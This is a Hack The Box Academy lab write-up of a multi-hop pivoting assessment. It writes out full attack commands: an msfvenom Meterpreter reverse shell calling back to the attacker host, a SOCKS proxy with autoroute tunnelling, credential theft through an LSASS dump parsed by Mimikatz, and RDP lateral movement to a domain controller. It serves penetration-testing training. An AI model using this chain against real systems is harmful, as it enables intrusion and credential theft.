# Pivoting, Tunneling, and Port Forwarding — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** Pivoting, Tunneling, and Port Forwarding  
**Assessment:** Skills Assessment  
**Difficulty:** Medium  
**Domain:** INLANEFREIGHT.LOCAL  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Host | Technique | Outcome |
|------|------|-----------|---------|
| 1 | Web Server | Web shell enumeration | SSH private key + note found in `/home/webadmin/` |
| 2 | Web Server | SSH key authentication | Foothold as `webadmin` on Ubuntu pivot host |
| 3 | Ubuntu Pivot | ICMP ping sweep | Discovered `172.16.5.35` (PIVOT-SRV01) |
| 4 | Ubuntu Pivot | Meterpreter + AutoRoute + SOCKS proxy | Internal `172.16.5.0/16` routed through proxychains |
| 5 | 172.16.5.35 | proxychains Nmap + RDP credential reuse | RDP access as `mlefay` — Flag 1 captured |
| 6 | 172.16.5.35 | Task Manager LSASS dump + Mimikatz | `vfrank` Kerberos cleartext password extracted |
| 7 | 172.16.6.25 | PowerShell ping sweep + RDP as `vfrank` | Second pivot host reached — Flag 2 captured |
| 8 | DC (Z: share) | Mounted network share `AutomateDCAdmin` | Domain Controller Flag 3 captured |

---

## Network Topology

```
[Attack Host: 10.10.15.28]
        ↓ Web shell → SSH key extraction
[Web Server / Ubuntu Pivot: 10.129.88.197]
  └── ens192: 172.16.5.15/16  ← internal NIC discovered
        ↓ Meterpreter + AutoRoute + SOCKS (172.16.5.0/16)
[PIVOT-SRV01: 172.16.5.35]   — Windows Server (RDP/SMB/SSH open)
  └── Credential reuse: mlefay
        ↓ LSASS dump → Mimikatz → vfrank credentials
  └── PowerShell ping sweep → 172.16.6.25 alive
        ↓ RDP as vfrank
[Workstation: 172.16.6.25]   — Windows 10
  └── Z: drive → AutomateDCAdmin share
        ↓ Mounted network share
[Domain Controller]          — Flag on Z:\Flag.txt
```

---

## Question 1 — Find the User Whose Directory Contains Pivot Credentials

**Question:** Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials?

### Step 1 — Access the Web Shell

Navigate to the target's web server root page. A web shell (`p0wny-shell`) was left behind from a previous engagement — accessible via the browser.

### Step 2 — Enumerate Home Directories

```bash
p0wny@shell:…/www/html# cd /home/
p0wny@shell:/home# ls

administrator
webadmin
```

Two home directories exist — `administrator` and `webadmin`.

### Step 3 — Check webadmin's Directory

```bash
p0wny@shell:/home# cd webadmin/
p0wny@shell:/home/webadmin# ls

for-admin-eyes-only
id_rsa
```

Two files found: a plaintext note and an SSH private key.

```bash
p0wny@shell:/home/webadmin# file id_rsa

id_rsa: OpenSSH private key
```

> **Answer:** `webadmin`

---

## Question 2 — Extract Credentials from the Note

**Question:** Submit the credentials found in the user's home directory. (Format: user:password)

```bash
p0wny@shell:/home/webadmin# cat for-admin-eyes-only

# note to self,
in order to reach server01 or other servers in the subnet from here
you have to use the user account: HTB{flag_redacted}
with a password of: HTB{flag_redacted}
```

A plaintext administrator note left in the home directory exposes valid domain credentials for pivoting to internal hosts. This is a textbook example of credential exposure through insecure file storage.

> **Answer:** `HTB{flag_redacted}`

---

## Question 3 — Enumerate the Internal Network and Discover the Next Host

**Question:** Enumerate the internal network and discover another active host. Submit the IP address of that host.

### Step 1 — Extract and Save the SSH Private Key

Read the private key from the web shell and save it locally:

```bash
p0wny@shell:/home/webadmin# cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
<key content>
-----END OPENSSH PRIVATE KEY-----
```

Save to a local file and set correct permissions:

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa
```

### Step 2 — SSH into the Ubuntu Pivot Host

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa webadmin@10.129.88.197

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
webadmin@inlanefreight:~$
```

### Step 3 — Identify the Internal Network Interface

```bash
webadmin@inlanefreight:~$ ip a

3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
```

The pivot host has a secondary NIC on `172.16.5.0/16` — a segment unreachable from the attack host directly. This is the network to enumerate.

### Step 4 — ICMP Ping Sweep to Discover Internal Hosts

```bash
webadmin@inlanefreight:~$ for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.771 ms
```

`172.16.5.15` is the pivot host itself. `172.16.5.35` is a new internal host — TTL of 128 indicates a Windows target.

> **Answer:** `172.16.5.35`

---

## Question 4 — Pivot to the Discovered Host and Capture Flag.txt

**Question:** Use the information you gathered to pivot to the discovered host. Submit the contents of `C:\Flag.txt`.

### Step 1 — Generate Linux Meterpreter Payload for Pivot Host

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.15.28 LPORT=9001 -f elf -o payload.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: payload.elf
```

### Step 2 — Transfer Payload to Ubuntu Pivot Host

```bash
Hackerpatel007_1@htb[/htb]$ scp -i id_rsa payload.elf webadmin@10.129.88.197:~/

payload.elf     100%  250    21.2KB/s   00:00
```

### Step 3 — Set Up Metasploit Multi/Handler

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 9001
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:9001
```

### Step 4 — Execute Payload on Pivot Host

```bash
webadmin@inlanefreight:~$ chmod +x payload.elf
webadmin@inlanefreight:~$ ./payload.elf
```

```bash
[*] Sending stage (3020772 bytes) to 10.129.88.197
[*] Meterpreter session 1 opened (10.10.15.28:9001 -> 10.129.88.197:37020)

(Meterpreter 1)(/home/webadmin) >
```

Meterpreter session established on the Ubuntu pivot host.

### Step 5 — Configure SOCKS Proxy and AutoRoute

Background the Meterpreter session and start the SOCKS proxy:

```bash
(Meterpreter 1)(/home/webadmin) > bg

[*] Backgrounding session 1...

msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > run

[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

Re-attach to the Meterpreter session and add internal route:

```bash
msf6 > sessions -i 1

(Meterpreter 1)(/home/webadmin) > run autoroute -s 172.16.5.0/16

[*] Adding a route to 172.16.5.0/255.255.0.0...
[+] Added route to 172.16.5.0/255.255.0.0 via 10.129.88.197
```

All traffic destined for `172.16.5.0/16` is now routed through the Meterpreter session on the Ubuntu pivot host.

### Step 6 — Enumerate 172.16.5.35 Through Proxychains

```bash
Hackerpatel007_1@htb[/htb]$ proxychains nmap 172.16.5.35 -Pn -sT

ProxyChains-3.1 (http://proxychains.sf.net)

Nmap scan report for 172.16.5.35
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

RDP (3389) is open — test the recovered credentials from `for-admin-eyes-only` for reuse.

### Step 7 — RDP to 172.16.5.35 via Proxychains

```bash
Hackerpatel007_1@htb[/htb]$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'HTB{flag_redacted}'

ProxyChains-3.1 (http://proxychains.sf.net)
Certificate details for 172.16.5.35:3389 (RDP-Server):
    Common Name: PIVOT-SRV01.INLANEFREIGHT.LOCAL
Do you trust the above certificate? (Y/T/N) Y
```

Credentials reused successfully — RDP session established as `mlefay` on `PIVOT-SRV01`.

### Step 8 — Read Flag.txt

```powershell
PS C:\Users\mlefay> type C:\Flag.txt

HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Question 5 — Identify the Vulnerable User via LSASS Dump

**Question:** Inlanefreight has a bad habit of utilizing service accounts in a way that exposes user credentials. What user is vulnerable?

### Step 1 — Transfer Mimikatz to PIVOT-SRV01

Download Mimikatz on the attack host and transfer it via the active RDP session's shared drive (`/drive:linux,.`):

```bash
Hackerpatel007_1@htb[/htb]$ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
Hackerpatel007_1@htb[/htb]$ unzip mimikatz_trunk.zip

inflating: x64/mimikatz.exe
```

Copy `x64/mimikatz.exe` to `PIVOT-SRV01` Desktop via the RDP shared drive.

### Step 2 — Create LSASS Memory Dump via Task Manager

On `PIVOT-SRV01`, open Task Manager as Administrator:

```
Task Manager → Details tab → Right-click lsass.exe → Create dump file
```

Dump saved to:
```
C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
```

### Step 3 — Parse the LSASS Dump with Mimikatz

Launch `mimikatz.exe` from the Desktop:

```
mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
```

```bash
mimikatz # sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP

Switch to MINIDUMP : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP'

mimikatz # sekurlsa::LogonPasswords

Opening : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP' file for minidump...

Authentication Id : 0 ; 160843 (00000000:0002744b)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 11/20/2022 10:09:13 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * NTLM     : HTB{hash_redacted}
         * SHA1     : HTB{hash_redacted}
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : HTB{flag_redacted}
```

`vfrank` is running a service account whose Kerberos session stored the cleartext password in LSASS memory — a direct result of the insecure service account configuration referenced in the question.

> **Answer:** `vfrank`

---

## Question 6 — Second Pivot — Reach the Workstation and Capture Flag.txt

**Question:** For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the contents of `C:\Flag.txt` on the workstation.

### Step 1 — Enumerate the 172.16.6.0/16 Network via PowerShell Ping Sweep

From the active RDP session on `PIVOT-SRV01` (`172.16.5.35`), open PowerShell:

```powershell
PS C:\Users\mlefay> 1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}

172.16.6.1: False
172.16.6.2: False
<SNIP>
172.16.6.25: True
172.16.6.26: False
```

Host `172.16.6.25` is alive — this is the next hop target.

### Step 2 — RDP to 172.16.6.25 as vfrank

Using the credentials recovered from LSASS, RDP directly from `PIVOT-SRV01` to `172.16.6.25`:

```
mstsc.exe → Computer: 172.16.6.25
Username: INLANEFREIGHT\vfrank
Password: HTB{flag_redacted}
```

RDP session established successfully on the workstation at `172.16.6.25`.

### Step 3 — Read Flag.txt

```cmd
C:\Users\vfrank> type C:\Flag.txt

HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Question 7 — Reach the Domain Controller and Capture the Final Flag

**Question:** Submit the contents of `C:\Flag.txt` located on the Domain Controller.

### Step 1 — Enumerate Mapped Network Drives

From the RDP session on `172.16.6.25`, open File Explorer and navigate to **This PC**. A mapped network drive is visible:

```
AutomateDCAdmin (Z:)
```

This is a pre-mapped administrative share connecting the workstation directly to the Domain Controller — likely configured for automated administrative tasks.

### Step 2 — Browse the Z: Drive and Read the Flag

Navigate to `Z:\` in File Explorer. The `Flag.txt` file is present at the root of the share:

```
Z:\Flag.txt
```

```
HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 — Credential directory | User whose home contains SSH key + note | `webadmin` |
| Q2 — Pivot credentials | User:password from `for-admin-eyes-only` | `HTB{flag_redacted}` |
| Q3 — Internal host | IP of discovered internal host | `172.16.5.35` |
| Q4 — PIVOT-SRV01 flag | `C:\Flag.txt` on `172.16.5.35` | `HTB{flag_redacted}` |
| Q5 — Vulnerable user | User with cleartext creds in LSASS | `vfrank` |
| Q6 — Workstation flag | `C:\Flag.txt` on `172.16.6.25` | `HTB{flag_redacted}` |
| Q7 — Domain Controller flag | `Flag.txt` via Z: mapped share | `HTB{flag_redacted}` |

---

## Lessons Learned

- **Web shells are not cleaned up.** Left behind from prior engagements or testing, web shells are a reliable entry point. Always check the web root and server configuration directories on any web server foothold.
- **SSH private keys in world-readable home directories** are a critical finding. A file with permissions `644` owned by `webadmin` is readable by anyone with a shell on the system — including the `www-data` user running the web shell.
- **Plaintext credentials in notes and config files** are one of the most common findings on real engagements. The `for-admin-eyes-only` file contained valid domain credentials in cleartext — stored insecurely in a home directory accessible via the web shell.
- **TTL values reveal OS type during ping sweeps.** `ttl=64` indicates Linux; `ttl=128` indicates Windows. This helps prioritise which discovered hosts to target next.
- **Meterpreter + AutoRoute + socks_proxy** is a powerful combination when SSH tunnelling is not an option. AutoRoute injects subnet routes into Metasploit's routing engine, and the SOCKS proxy lets proxychains forward all tool traffic through the active Meterpreter session transparently.
- **Credential reuse across hosts is extremely common in enterprise environments.** The `mlefay` credentials found in a plaintext note worked directly for RDP on `PIVOT-SRV01` — always test recovered credentials against every discovered service.
- **Service accounts running with interactive logon sessions store Kerberos keys in LSASS memory.** When a service is configured to log on as a domain user and that user authenticates interactively, Mimikatz can recover the cleartext password from the Kerberos ticket cache — even if WDigest is disabled.
- **Mapped network drives on workstations often connect directly to sensitive infrastructure.** The `AutomateDCAdmin (Z:)` share on the final workstation provided unauthenticated file access to the Domain Controller — a misconfiguration that shortcuts the final escalation entirely.
- **Multi-hop pivoting follows a pattern:** foothold → enumerate NICs → discover next segment → establish tunnel → enumerate next segment → repeat. Drawing the network topology as you go prevents disorientation and missed paths.

---

## Full Attack Chain Reference

```
Web shell (p0wny-shell) on 10.129.88.197
        ↓
/home/webadmin/ → id_rsa (SSH private key) + for-admin-eyes-only (mlefay credentials)
        ↓
SSH -i id_rsa webadmin@10.129.88.197
        ↓
ip a → ens192: 172.16.5.15/16 (internal NIC discovered)
        ↓
ICMP ping sweep → 172.16.5.35 alive (ttl=128, Windows)
        ↓
msfvenom Linux ELF → SCP to pivot host → execute
        ↓
Meterpreter session 1 on webadmin@172.16.5.15
        ↓
socks_proxy (port 9050) + autoroute -s 172.16.5.0/16
        ↓
proxychains nmap 172.16.5.35 → ports 22,135,139,445,3389 open
        ↓
proxychains xfreerdp /v:172.16.5.35 /u:mlefay → credential reuse success
        ↓
C:\Flag.txt → HTB{flag_redacted}  [Flag 1]
        ↓
Task Manager → lsass.exe → Create dump file → C:\...\lsass.DMP
        ↓
Mimikatz: sekurlsa::minidump lsass.DMP → sekurlsa::LogonPasswords
        ↓
vfrank:HTB{flag_redacted} recovered from Kerberos session in LSASS
        ↓
PowerShell ping sweep 172.16.6.0/16 → 172.16.6.25 alive
        ↓
mstsc.exe → 172.16.6.25 as INLANEFREIGHT\vfrank
        ↓
C:\Flag.txt → HTB{flag_redacted}  [Flag 2]
        ↓
This PC → AutomateDCAdmin (Z:) mapped share → Domain Controller
        ↓
Z:\Flag.txt → HTB{flag_redacted}  [Flag 3 — DC]
```

---

## Commands Reference

| Command | Purpose |
|---------|----------|
| `ls /home/` | Enumerate user home directories via web shell |
| `cat for-admin-eyes-only` | Read plaintext credential note |
| `cat id_rsa` | Read SSH private key for extraction |
| `chmod 600 id_rsa` | Set correct permissions on SSH private key |
| `ssh -i id_rsa webadmin@<IP>` | SSH into pivot host using private key |
| `ip a` | Identify all network interfaces and IP assignments |
| `for i in {1..254};do (ping -c 1 172.16.5.$i \| grep "bytes from" &); done` | ICMP ping sweep of internal subnet |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.elf` | Generate Linux Meterpreter payload |
| `scp -i id_rsa payload.elf webadmin@<IP>:~/` | Transfer payload to pivot host |
| `chmod +x payload.elf && ./payload.elf` | Execute payload on pivot host |
| `use exploit/multi/handler` | Start Metasploit listener |
| `use auxiliary/server/socks_proxy` | Start SOCKS4a proxy via Meterpreter |
| `run autoroute -s 172.16.5.0/16` | Add route to internal subnet through Meterpreter |
| `proxychains nmap 172.16.5.35 -Pn -sT` | Scan internal host through SOCKS proxy (TCP connect) |
| `proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'<pass>'` | RDP to internal Windows host via SOCKS proxy |
| `type C:\Flag.txt` | Read flag file on Windows target |
| `wget <mimikatz_url> && unzip mimikatz_trunk.zip` | Download and extract Mimikatz |
| `sekurlsa::minidump C:\...\lsass.DMP` | Load LSASS dump into Mimikatz |
| `sekurlsa::LogonPasswords` | Extract all credentials from LSASS dump |
| `1..254 \| % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}` | PowerShell ping sweep on Windows |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application (web shell access) |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files (`for-admin-eyes-only`) |
| T1021 | T1021.004 | Remote Services: SSH (key-based authentication to pivot host) |
| T1018 | — | Remote System Discovery (ping sweep → 172.16.5.35, 172.16.6.25) |
| T1090 | T1090.001 | Internal Proxy (Meterpreter SOCKS proxy + AutoRoute) |
| T1572 | — | Protocol Tunneling (Meterpreter session as tunnel for proxychains traffic) |
| T1021 | T1021.001 | Remote Services: RDP (proxychains xfreerdp to 172.16.5.35 and 172.16.6.25) |
| T1078 | T1078.002 | Valid Accounts: Domain Accounts (mlefay and vfrank credential reuse) |
| T1003 | T1003.001 | OS Credential Dumping: LSASS Memory (Task Manager dump + Mimikatz) |
| T1550 | T1550.002 | Use Alternate Authentication Material (harvested credentials for lateral movement) |
| T1039 | — | Data from Network Shared Drive (Z: AutomateDCAdmin share on DC) |
| T1105 | — | Ingress Tool Transfer (Mimikatz and ELF payload via SCP/RDP share) |

---

*Part of the HTB Academy CPTS path — Pivoting, Tunneling, and Port Forwarding module.*  
*Penetration Tester role in India | Target: January 2027*
